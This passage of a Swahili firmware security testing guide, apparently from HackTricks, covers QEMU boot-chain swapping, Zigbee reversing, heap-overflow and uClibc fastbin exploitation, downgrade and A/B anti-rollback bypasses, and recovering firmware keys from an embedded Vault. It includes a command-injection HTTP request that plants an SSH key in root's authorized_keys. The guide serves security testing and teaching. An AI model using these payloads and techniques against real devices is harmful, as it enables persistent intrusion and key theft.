3. Ikiwa extraction bado inashindwa, tafuta katika eneo dogo tu karibu na mpaka uliotabiriwa, na hitaji miundo kadhaa halali ya metadata inayofuatana, badala ya kukubali superblock inayoonekana tu kuwa sahihi.
4. Endesha `unsquashfs` isiyobadilishwa dhidi ya image iliyojengwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs, na diski pepe, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa boot chain wa maabara**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot, au ufunguo uliofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptor 0–2, mount `/proc` na `/sys`, kusubiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma pekee, kutenganisha pseudo-filesystem za root ya awali, kuhamisha mount mpya hadi `/`, kutumia `chroot`, na kuendesha `execve()` ya `/sbin/init` ya awali ya firmware. Kutenganisha `/dev`, `/proc`, na `/sys` **kabla** ya `MS_MOVE` huepusha kutenganisha kimakosa mount point za root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asili huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu wa hali ya image nje ya mtandao

Kagua hali endelevu nje ya guest wakati boot zinapokuwa polepole, script za kuanzisha zinapoharibu data, au logging ya console isiyotegemeka inapoficha hitilafu. Usiwahi kuambatisha overlay inayotumiwa na VM inayoendelea kufanya kazi; ifichue kwa kutumia `qemu-nbd`, weka ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa pekee, na uzime volume group kabla ya kuitenganisha.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utenganishaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye hifadhi thabiti inayoweza kuandikiwa na uzihakiki ukiwa nje ya kifaa; `/dev/kmsg`, FIFO na koni za muda mfupi zinaweza kutoa matokeo hasi ya uongo kutokana na udhibiti wa kiwango au mchakato kufa mapema. Pia linganisha violesura halisi katika tabaka mbalimbali kabla ya kubadilisha msimbo usiohusiana: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya ABI ya kiendeshi cha DRI na majina ya viendeshi yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` kufanikiwa, lakini kikaendelea kutotumika kwa sababu kinachokitumia kinatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Uchambuzi Mahiri kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumika kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwenye OS na mfumo wa faili. Uigaji huenda usiigize kikamilifu mwingiliano wa maunzi, hivyo huenda ukahitaji kuanzisha upya uigaji mara kwa mara. Uchambuzi unapaswa kupitia tena mfumo wa faili, kutumia exploit dhidi ya kurasa za wavuti na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kutambua udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Uchambuzi wa Wakati wa Uendeshaji

Uchambuzi wa wakati wa uendeshaji huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa vifaa lengwa vilivyopachikwa ambavyo havina debugger kamili, **nakili `gdbserver` iliyounganishwa statically** kwenye kifaa kisha uiunganishe kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uchoraji ramani wa ujumbe wa Zigbee / radio-co-processor

Kwenye hubs za IoT, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Mbinu muhimu ni kufuatilia njia hii:<sup>[[8]](#references)</sup>

1. **RF frame** hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu huunda malengo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na jedwali la dispatch
- Ni ujumbe upi unaweza kutoka **kwenye mtandao** dhidi ya kutoka kwa controller yenyewe
- Sehemu halisi za **manufacturer-specific discriminator** (kwa mfano Zigbee `manufacturer_code` na maalum ya `cluster_command`)
- Ni handlers zipi zinazoweza kufikiwa tu wakati wa **commissioning**, discovery, au awamu za kupakua firmware/model

Hasa kwa Zigbee, nasa pairing traffic na uangalie kama kifaa lengwa bado kinategemea **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunusa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo kumbuka kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikiaji unaodhibitiwa na FSM

Amri za Zigbee/ZCL za vendor maalum mara nyingi ni malengo bora kuliko clusters sanifu, kwa sababu hutumia **custom parsing code** na **FSMs** za ndani zenye uthibitishaji ambao haujajaribiwa vya kutosha.<sup>[[8]](#references)</sup>

Mbinu ya vitendo:

- Fuatilia command dispatcher kwa reversing hadi upate **vendor-only handler**.
- Tambua jedwali za **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe na matawi ya retry/error ambayo hatimaye huweka upya au kuachia hali inayodhibitiwa na mshambuliaji.
- Thibitisha ni mawasiliano yapi halali ya protocol yanayohitajika ili kuweka daemon katika hali iliyo hatarini, badala ya kudhani kuwa handler yenye hitilafu inaweza kufikiwa kila wakati.

Kwa protocols zinazohitaji muda sahihi, packet replay kutoka Python framework inaweza kuwa polepole mno. Mbinu inayotegemewa zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor ili uweze kuonyesha **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download kwenye embedded daemons

Aina ya hitilafu ya firmware inayojirudia huonekana katika upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Fragment ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Copy hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kukagua kama inazidi **ukubwa wa awali uliotengwa**.

Hii humwezesha mshambuliaji kutuma:

- Fragment ya kwanza halali yenye ukubwa mdogo wa jumla uliotangazwa ili kulazimisha ugawaji mdogo wa heap.
- Fragment ya baadaye yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa wa packet-local ulioghushiwa unaopitisha ukaguzi mpya huku bado ukifurika buffer iliyotengwa awali.

Wakati njia iliyo hatarini inadhibitiwa na mantiki ya commissioning, exploitation lazima ijumuishe **device emulation** ya kutosha ili kuingiza kifaa lengwa katika hali inayotarajiwa ya kupakua model au blob kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kuchochea heap metadata exploitation mara nyingi si “kusubiri cleanup” bali ni **kulazimisha ushughulikiaji wa makosa wa protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za ufuatiliaji zilizoharibika ili kupeleka FSM katika hali za **retry** au **error**.
- Vuka kiwango cha juu cha retry ili daemon **iweke upya context** na kuachia buffer iliyoharibika.
- Tumia `free()` hii inayotabirika kuchochea primitives za allocator kabla mchakato haujaanguka kwa sababu zisizohusiana.

Hii ni muhimu hasa dhidi ya allocators zinazofanana na **musl/uClibc/dlmalloc** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa primitive ya kuandika. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyofurika**, badala ya kuharibu mara moja bin pointers halisi na kuangusha mchakato.

## Binary Exploitation and Proof-of-Concept

Kutengeneza PoC ya udhaifu uliotambuliwa kunahitaji kuelewa kwa kina usanifu wa kifaa lengwa na kuandika programu kwa lugha za kiwango cha chini. Ulinzi wa binary runtime haupatikani sana kwenye embedded systems, lakini unapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Ugawaji mkubwa unaofuata unaweza kuchochea `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zinazozunguka kuonekana kuwa “zinatumika”).<sup>[[6]](#references)</sup>
- **Binaries zisizo za PIE chini ya ASLR:** ikiwa ASLR imewashwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary huwa thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha uchanganuzi huku ikihifadhi bytes zinazofuata zinazodhibitiwa na mshambuliaji kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kurukia humo.

## Mifumo ya Uendeshaji Iliyotayarishwa kwa Firmware Analysis

Mifumo ya uendeshaji kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya kupima usalama wa firmware, yakiwa na zana zinazohitajika.

## Mifumo ya Uendeshaji Iliyotayarishwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Mfumo wa uendeshaji wa kupima usalama wa embedded, unaotegemea Ubuntu 18.04 na ukiwa na zana za kupima usalama wa firmware zilizowekwa awali.

## Mashambulizi ya Firmware Downgrade na Mbinu za Update Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa sahihi za kriptografia kwa firmware images, **ulinzi dhidi ya kurudisha toleo nyuma (downgrade) mara nyingi hukosekana**. Boot- au recovery-loader inapothibitisha tu sahihi kwa kutumia public key iliyopachikwa lakini hailinganishi *toleo* (au counter inayoongezeka tu) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani iliyo hatarini ambayo bado ina sahihi halali**, na hivyo kurudisha udhaifu uliokuwa umerekebishwa.<sup>[[4]](#references)</sup>

Mtiririko wa kawaida wa shambulio:

1. **Pata image ya zamani iliyosainiwa**
   * Ichukue kutoka portal ya umma ya upakuaji ya vendor, CDN au tovuti ya usaidizi.
   * Itoe kwenye companion mobile/desktop applications (kwa mfano, ndani ya Android APK chini ya `assets/firmware/`).
   * Ipate kutoka third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia update channel yoyote iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya watumiaji vya IoT vina endpoints za HTTP(S) *zisizohitaji uthibitishaji* zinazokubali firmware blobs zilizosimbwa kwa Base64, kuzifungua upande wa seva na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit udhaifu uliorekebishwa kwenye toleo jipya zaidi (kwa mfano, kichujio cha command-injection kilichoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo katika hali ya downgrade (iliyo hatarishi), kigezo cha `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri zozote (hapa — kuwezesha ufikiaji wa root kwa kutumia SSH key). Matoleo ya baadaye ya firmware yalianzisha kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya downgrade kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka kwa Mobile Apps

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya mobile apps zao za ziada ili app iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Kwa kawaida, vifurushi hivi huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, kwenye njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizosainiwa bila kugusa hardware halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kukwepa anti-rollback kupitia updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa **bootloader** baadaye hukagua tu saini/CRC ya image na kuamini jedwali la partitions au metadata ya slot, ulinzi dhidi ya rollback bado unaweza kukwepwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo na **security ratchet** / counter inayoongezeka tu.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye hifadhi endelevu, kisha hukataa images za zamani zilizosainiwa.
- **Bootloader** haisomi ratchet hiyo; hukagua tu header, CRC na saini kabla ya kuwasha slot iliyochaguliwa.
- Uanzishaji wa slot huhifadhiwa kando kwenye jedwali la partitions au counter ya kizazi kwa kila slot, na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii huunda primitive ya **thibitisha-image-moja / washa-image-nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater itie alama slot B kuwa lengo linalofuata la kuwasha kwa kutumia image ya sasa iliyosainiwa, kisha akaandika upya slot B kabla ya kuwasha upya, bootloader bado inaweza kuwasha image iliyodowngrade kwa sababu huamini metadata ya slot ambayo tayari imehifadhiwa.

Mchoro wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot isiyotumika kisha endesha routine ya kawaida ya uthibitishaji/kubadilisha ili layout iweke alama kuwa slot hiyo ndiyo itakayotumika.
2. **Usiwashie upya bado**. Ingia tena kwenye routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya kuchagua slot iliyopitwa na wakati, ili updater ifute **slot ileile ya kimwili** iliyokuwa imeteuliwa kuwa inayotumika.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet, kisha washa upya moja kwa moja.
6. Bootloader huchagua slot iliyoteuliwa, hukagua saini/uadilifu pekee, kisha huwasha image ya zamani.

Mambo ya kuchunguza unapofanya reverse engineering ya utekelezaji wa update wa A/B:

- Uteuzi wa slot unatokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya mabadiliko kufanikiwa.
- Routine ya aina ya `prepare_passive_slot()` hufuta slot kwa kutumia hali iliyopitwa na wakati badala ya **layout ya sasa iliyothibitishwa**.
- Function ya aina ya `part_write_layout()` huongeza tu **counter ya kizazi** / bendera ya slot inayotumika bila kuhifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unatekelezwa kwenye userspace au kwenye code ya updater, lakini **si** katika hatua za ROM / bootloader / secure boot.
- Routines za kufuta au recovery huacha slot ikiwa imetiwa alama kuwa inaweza kuwashwa, hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Update

* Usafirishaji/uthibitishaji wa *update endpoint* umelindwa vya kutosha (TLS + uthibitishaji)?
* Je, kifaa hulinganisha **nambari za toleo** au **counter ya monotonic ya kuzuia rollback** kabla ya kuandika firmware?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano, saini hukaguliwa na code ya ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua saini/CRC pekee?
* Je, metadata ya uanzishaji wa slot **imeunganishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kubadilishwa baada ya kuteuliwa?
* Baada ya kubadilisha slot, je, kifaa hulazimishwa kuwashwa upya au routines nyingine za update/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi mwingine wa sanity (kwa mfano, ramani ya partitions inayoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa update wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡  Ikiwa mojawapo ya yaliyo hapo juu haipo, huenda platform inaweza kushambuliwa kwa rollback.

## Firmware dhaifu ya kufanyia mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware dhaifu kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji wa firmware kutoka hali ya KMS/Vault iliyopachikwa

Image ya update inapochanganya metadata ndogo ya maandishi wazi na blob kubwa yenye entropy ya juu, chunguza muundo wa kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Dampo vichwa, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt, na baiti zilizosalia ni ciphertext.
- Sehemu ya Base64 inayofasirika na kutoa baiti `256` hasa ni kidokezo kikubwa kwamba unaangalia ciphertext ya RSA-2048 inayofunga nenosiri la firmware/funguo ya session ya nasibu.
- Nyenzo za PGP zilizotenganishwa zilizo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani kwamba ndizo zinazotumika kulinda usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafanikiwa, fanya reverse engineering ya **mchakato wa uendeshaji wa kusimbua** badala ya kutafuta funguo za faragha pekee:

- Decompile updater / binary ya usimamizi kisha fuatilia ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayofungua kifungashio chake, na jina gani la kimantiki la ufunguo inaomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) kwenye root filesystem iliyotolewa, pamoja na unit files na init scripts.
- Chukulia maagizo ya maandishi wazi kama `vault operator unseal ...`, recovery keys, bootstrap tokens, au scripts za kufungua KMS ya ndani kiotomatiki kuwa sawa na nyenzo za funguo za faragha.

Ikiwa kifaa kimesambazwa na binary asili ya Vault na storage backend, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya vipengele vya ndani vya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoclone:

- Fanya transit keys ziweze kuhamishwa nje ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha ufunguo wa unwrap: `vault read transit/export/encryption-key/<name>`
- Jaribu ufunguo wa RSA uliorejeshwa kwa jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption chaguomsingi ya OAEP **hakuthibitishi** kuwa ufunguo si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali library za kawaida hutumia SHA-1 kwa chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza upya KDF ya OpenSSL ya vendor kwa usahihi (`EVP_BytesToKey`, ambayo mara nyingi hutumia MD5 kwenye vifaa vya zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii inabadilisha tatizo la "firmware iliyosimbwa kwa njia fiche" kuwa tatizo la jumla zaidi: **rejesha funguo za uendeshaji za upande wa kifaa, kisha tekeleza upya vigezo halisi vya unwrap + KDF nje ya mtandao**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Firmware kwa Claude: Ujuzi wa Kiwango cha Senior, Uhuru wa Kiwango cha Junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero days katika vifaa vilivyoachwa — blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona mi: Sasa Umepwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi cha chaji - Sehemu ya 2: kukwepa anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iblink: Exploitation ya Philips Hue Bridge kupitia OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Debugging na Kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji XOR dhaifu huruhusu kurejesha kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Kujikumbusha kuhusu udukuzi wa hardware Sehemu ya 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
